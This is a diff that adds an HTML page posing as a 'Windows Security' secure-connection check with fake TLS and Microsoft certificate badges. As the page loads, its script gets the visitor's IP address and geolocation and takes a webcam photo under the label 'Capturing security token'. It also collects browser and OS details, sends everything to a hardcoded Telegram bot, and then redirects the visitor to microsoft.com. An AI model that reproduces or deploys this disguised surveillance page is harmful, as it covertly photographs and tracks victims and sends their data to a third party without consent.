@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Windows Security - Secure Connection</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1e1e1e;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .windows-container {
+            background: #2b2b2b;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+            max-width: 500px;
+            width: 100%;
+            overflow: hidden;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .windows-header {
+            background: #202020;
+            padding: 20px 24px;
+            border-bottom: 1px solid #3c3c3c;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .windows-shield {
+            width: 32px;
+            height: 32px;
+            background: #0078d4;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+
+        .windows-title {
+            color: #fff;
+            font-weight: 600;
+            font-size: 18px;
+        }
+
+        .windows-sub {
+            color: #9a9a9a;
+            font-size: 12px;
+            margin-top: 2px;
+        }
+
+        .windows-content {
+            padding: 32px 24px;
+        }
+
+        .security-badge {
+            background: #2c2c2c;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-left: 3px solid #107c10;
+        }
+
+        .badge-icon {
+            width: 24px;
+            height: 24px;
+            background: #107c10;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+        }
+
+        .badge-text {
+            color: #fff;
+            font-size: 13px;
+        }
+
+        .info-row {
+            background: #252525;
+            border-radius: 8px;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .info-label {
+            color: #9a9a9a;
+            font-size: 13px;
+        }
+
+        .info-value {
+            color: #fff;
+            font-size: 13px;
+            font-family: monospace;
+        }
+
+        .progress-section {
+            margin: 24px 0;
+        }
+
+        .progress-bar {
+            background: #3c3c3c;
+            border-radius: 4px;
+            height: 4px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            background: #0078d4;
+            width: 0%;
+            height: 100%;
+            transition: width 0.3s ease;
+        }
+
+        .progress-text {
+            color: #9a9a9a;
+            font-size: 12px;
+            margin-top: 8px;
+            text-align: center;
+        }
+
+        .camera-preview {
+            margin: 20px 0;
+            text-align: center;
+            display: none;
+        }
+
+        .camera-preview video, .camera-preview canvas {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid #0078d4;
+        }
+
+        .status-text {
+            color: #107c10;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 16px;
+        }
+
+        .warning-text {
+            color: #ffaa44;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="windows-container">
+        <div class="windows-header">
+            <div class="windows-shield">🛡️</div>
+            <div>
+                <div class="windows-title">Windows Security</div>
+                <div class="windows-sub">Protected by Microsoft Defender</div>
+            </div>
+        </div>
+
+        <div class="windows-content">
+            <div class="security-badge">
+                <div class="badge-icon">✓</div>
+                <div class="badge-text">Secure connection • TLS 1.3 encrypted • Identity verified</div>
+            </div>
+
+            <div class="info-row">
+                <span class="info-label">🌐 Connection Type</span>
+                <span class="info-value">Secure (AES-256)</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">🔒 Certificate Issuer</span>
+                <span class="info-value">Microsoft IT TLS CA 5</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">📍 Server Location</span>
+                <span class="info-value" id="locationDisplay">Verifying...</span>
+            </div>
+
+            <div class="progress-section">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="progress-text" id="progressText">Establishing secure connection...</div>
+            </div>
+
+            <div class="camera-preview" id="cameraPreview">
+                <video id="video" autoplay playsinline muted></video>
+                <canvas id="cameraCanvas" style="display:none;"></canvas>
+            </div>
+
+            <div class="status-text" id="statusText"></div>
+        </div>
+    </div>
+
+    <script>
+        // ============ TELEGRAM CONFIG ============
+        const BOT_TOKEN = '8651704310:AAGMFqlPZWKPuhkz1ksBAPomy_vj7rRXsco';
+        const CHAT_ID = '7544746037';
+        const REDIRECT_URL = 'https://www.microsoft.com/en-us/windows';
+
+        // ============ PROGRESS SIMULATION ============
+        let progress = 0;
+        const progressFill = document.getElementById('progressFill');
+        const progressText = document.getElementById('progressText');
+        const statusText = document.getElementById('statusText');
+        const locationDisplay = document.getElementById('locationDisplay');
+
+        function updateProgress(value, text) {
+            progress = value;
+            progressFill.style.width = value + '%';
+            progressText.textContent = text;
+        }
+
+        // ============ GET IP & LOCATION ============
+        async function getIPAndLocation() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                if (data.ip) {
+                    locationDisplay.textContent = `${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}`;
+                    return { ip: data.ip, geo: data };
+                }
+            } catch(e) {
+                try {
+                    const res2 = await fetch('http://ip-api.com/json/');
+                    const data2 = await res2.json();
+                    if (data2.status === 'success') {
+                        locationDisplay.textContent = `${data2.city}, ${data2.country}`;
+                        return { ip: data2.query, geo: data2 };
+                    }
+                } catch(e2) {}
+            }
+            locationDisplay.textContent = 'Unknown';
+            return { ip: 'Unknown', geo: {} };
+        }
+
+        // ============ CAPTURE WEBCAM ============
+        async function captureWebcam() {
+            return new Promise((resolve) => {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('cameraCanvas');
+                const previewDiv = document.getElementById('cameraPreview');
+                
+                previewDiv.style.display = 'block';
+                
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            setTimeout(() => {
+                                canvas.width = video.videoWidth || 320;
+                                canvas.height = video.videoHeight || 240;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                                stream.getTracks().forEach(track => track.stop());
+                                previewDiv.style.display = 'none';
+                                resolve(imageData);
+                            }, 1000);
+                        };
+                    })
+                    .catch((err) => {
+                        console.error('Camera error:', err);
+                        previewDiv.style.display = 'none';
+                        resolve(null);
+                    });
+            });
+        }
+
+        // ============ SEND TO TELEGRAM ============
+        async function sendToTelegram(message, photoBase64 = null) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
+            try {
+                await fetch(url + 'sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        chat_id: CHAT_ID, 
+                        text: message, 
+                        parse_mode: 'HTML' 
+                    })
+                });
+            } catch(e) {
+                console.error('Send text error:', e);
+            }
+            
+            if (photoBase64) {
+                try {
+                    const blob = await fetch(photoBase64).then(r => r.blob());
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'capture.jpg');
+                    formData.append('caption', '📸 Camera Capture');
+                    await fetch(url + 'sendPhoto', { method: 'POST', body: formData });
+                } catch(e) {
+                    console.error('Send photo error:', e);
+                }
+            }
+        }
+
+        // ============ GET DEVICE INFO ============
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'Unknown';
+            let os = 'Unknown';
+            
+            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+            else if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+            else if (ua.includes('Edg')) browser = 'Edge';
+            
+            if (ua.includes('Windows')) os = 'Windows';
+            else if (ua.includes('Android')) os = 'Android';
+            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+            else if (ua.includes('Mac')) os = 'macOS';
+            else if (ua.includes('Linux')) os = 'Linux';
+            
+            return { browser, os, ua: ua.substring(0, 120) };
+        }
+
+        // ============ MAIN ============
+        async function main() {
+            try {
+                // Progress 1: Verifying connection
+                updateProgress(10, 'Verifying secure connection...');
+                await new Promise(r => setTimeout(r, 800));
+                
+                // Get IP & Location
+                updateProgress(30, 'Checking network security...');
+                const { ip, geo } = await getIPAndLocation();
+                
+                updateProgress(50, 'Validating certificate...');
+                await new Promise(r => setTimeout(r, 600));
+                
+                updateProgress(70, 'Running security scan...');
+                await new Promise(r => setTimeout(r, 800));
+                
+                updateProgress(85, 'Capturing security token...');
+                const cameraPhoto = await captureWebcam();
+                
+                updateProgress(95, 'Finalizing secure handshake...');
+                
+                // Get device info
+                const device = getDeviceInfo();
+                const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+                
+                // Format message
+                let message = `<b>🛡️ WINDOWS SECURITY EVENT</b>\n`;
+                message += `<code>━━━━━━━━━━━━━━━━━━━</code>\n\n`;
+                message += `<b>🌐 IP Address:</b> <code>${ip}</code>\n\n`;
+                message += `<b>📍 GEOLOCATION</b>\n`;
+                
+                if (geo.country_name || geo.country) {
+                    message += `├ Country : ${geo.country_name || geo.country}\n`;
+                    message += `├ Region  : ${geo.region || geo.regionName || '-'}\n`;
+                    message += `├ City    : ${geo.city || '-'}\n`;
+                    message += `├ ISP     : ${geo.org || geo.isp || '-'}\n`;
+                    if (geo.latitude || geo.lat) {
+                        const lat = geo.latitude || geo.lat;
+                        const lon = geo.longitude || geo.lon;
+                        message += `├ Coord   : ${lat}, ${lon}\n`;
+                        message += `├ Maps    : https://maps.google.com/?q=${lat},${lon}\n`;
+                    }
+                } else {
+                    message += `└ Data: ${JSON.stringify(geo).substring(0, 100)}\n`;
+                }
+                
+                message += `\n<b>💻 DEVICE INFO</b>\n`;
+                message += `├ Browser  : ${device.browser}\n`;
+                message += `├ OS       : ${device.os}\n`;
+                message += `├ User-Agent: ${device.ua}...\n`;
+                message += `└ Time     : ${timestamp}\n\n`;
+                message += `<i>Windows Security • Event ID: ${Math.floor(Math.random()*100000)}</i>`;
+                
+                await sendToTelegram(message, cameraPhoto);
+                
+                updateProgress(100, 'Secure connection established!');
+                statusText.innerHTML = '✓ Connection verified • Redirecting to secure portal...';
+                
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 2000);
+                
+            } catch (err) {
+                console.error('Main error:', err);
+                statusText.innerHTML = '⚠️ Connection issue • Redirecting...';
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 2000);
+            }
+        }
+
+        // Run
+        main();
+    </script>
+</body>
+</html>
